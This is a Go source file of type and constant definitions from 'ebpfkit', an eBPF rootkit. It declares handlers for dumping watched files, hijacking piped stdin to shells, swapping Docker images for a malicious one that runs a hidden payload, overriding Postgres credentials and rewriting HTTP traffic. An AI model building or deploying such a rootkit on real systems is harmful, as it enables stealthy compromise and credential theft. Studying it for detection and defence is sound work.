/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package ebpfkit

// Options contains the parameters
type Options struct {
	TargetHTTPServerPort int
	IngressIfname        string
	EgressIfname         string
}

func (o Options) check() error {
	return nil
}

// HTTPHandler is used to route HTTP requests to eBPF handlers
type HTTPHandler uint32

const (
	// HTTPActionHandler is the handler used to apply the requested HTTP action
	HTTPActionHandler HTTPHandler = iota
	// AddFSWatchHandler is the handler used to add a filesystem watch
	AddFSWatchHandler
	// DelFSWatchHandler is the handler used to remove a filesystem watch
	DelFSWatchHandler
	// GetFSWatchHandler is the handler used to dump a file
	GetFSWatchHandler
	// DNSResponseHandler is the handler used to handle DNS response
	DNSResponseHandler
	// PutPipeProgHandler is the handler used to send a new piped program
	PutPipeProgHandler
	// DelPipeProgHandler is the handler used to delete a piped program
	DelPipeProgHandler
	// PutDockerImageHandler is the handler used to send a new Docker image override
	PutDockerImageHandler
	// DelDockerImageHandler is the handler used to remove a Docker image override request
	DelDockerImageHandler
	// PutPostgresRoleHandler is the handler used to override a set of Postgres credentials
	PutPostgresRoleHandler
	// DelPostgresRoleHandler is the handler used to remove a set of Postgres credentials
	DelPostgresRoleHandler
)

// RawSyscallProg is used to define the tail call key of each syscall
type RawSyscallProg uint32

const (
	newfstatat RawSyscallProg = 262
)

// HTTPAction is used to define the action to take for a given HTTP request
type HTTPAction uint32

const (
	// Drop indicates that the packet should be dropped
	Drop HTTPAction = iota + 1
	// Edit indicates that the packet should be edited with the provided data
	Edit
)

// HTTPDataBuffer contains the HTTP data used to replace the initial request
type HTTPDataBuffer [256]byte

func NewHTTPDataBuffer(data string) [256]byte {
	rep := [256]byte{}
	copy(rep[:], data[:])
	return rep
}

func NewCommBuffer(from string, to string) [32]byte {
	rep := [32]byte{}
	copy(rep[:], from)
	copy(rep[16:], to)
	return rep
}

func NewPipedProgram(prog string) [467]byte {
	rep := [467]byte{}
	copy(rep[:], prog)
	return rep
}

func NewDockerImage68(image string) [68]byte {
	rep := [68]byte{}
	copy(rep[:], image)
	return rep
}

type ImageOverrideKey struct {
	Prefix uint32
	Image  [68]byte
}

const (
	// DockerImageNop is used to indicate that ebpfkit shouldn't change anything for the current image.
	DockerImageNop uint16 = iota
	// DockerImageReplace is used to indicate that ebpfkit should replace the old image with the one provided in the
	// ReplaceWith field.
	DockerImageReplace
)

const (
	// PingNop means that the rootkit will not answer to the ping
	PingNop uint16 = iota
	// PingCrash means that the pause container should crash
	PingCrash
	// PingRun means that the pause container should behave as the normal k8s pause container, while running its payload
	PingRun
	// PingHide means that the pause container should behave as the normal k8s pause container, while running its payload
	// from a hidden pid
	PingHide
)

type ImageOverride struct {
	// Override defines if eBPFKit should override the image
	Override uint16
	// Ping defines what the malicious image should do on startup
	Ping uint16
	// Prefix defines the minimum length of the prefix used to query the LPM trie. Use the same value as the key.
	Prefix uint32
	// ReplaceWith defines the Docker image to use instead of the one defined in the key.
	ReplaceWith [64]byte
}

func NewDockerImage64(image string) [64]byte {
	rep := [64]byte{}
	copy(rep[:], image)
	return rep
}

type FSWatchKey struct {
	Flag     uint8
	Filepath [256]byte
}

func NewFSWatchFilepath(key string) [256]byte {
	rep := [256]byte{}
	copy(rep[:], key)
	return rep
}

var (
	// HealthCheckRequest is the default healthcheck request
	HealthCheckRequest = NewHTTPDataBuffer("GET /healthcheck HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: localhost:8000")
	// HealthCheckRequestLen is the length of the default healthcheck request
	HealthCheckRequestLen = uint32(112)
)

type HTTPRoute struct {
	HTTPAction HTTPAction
	Handler    HTTPHandler
	NewDataLen uint32
	NewData    [256]byte
}

const (
	// DNSMaxLength is the max DNS name length in a DNS request or response
	DNSMaxLength = 256
	// DNSMaxLabelLength is the max size of a label in a DNS request or response
	DNSMaxLabelLength = 63
)

type CommProgKey struct {
	ProgKey uint32
	Backup  uint32
}

const (
	// PipeOverridePythonKey is the key used to override a piped stdin to a python process
	PipeOverridePythonKey = uint32(1)
	// PipeOverrideShellKey is the key used to override a piped stdin to a shell process
	PipeOverrideShellKey = uint32(2)
)
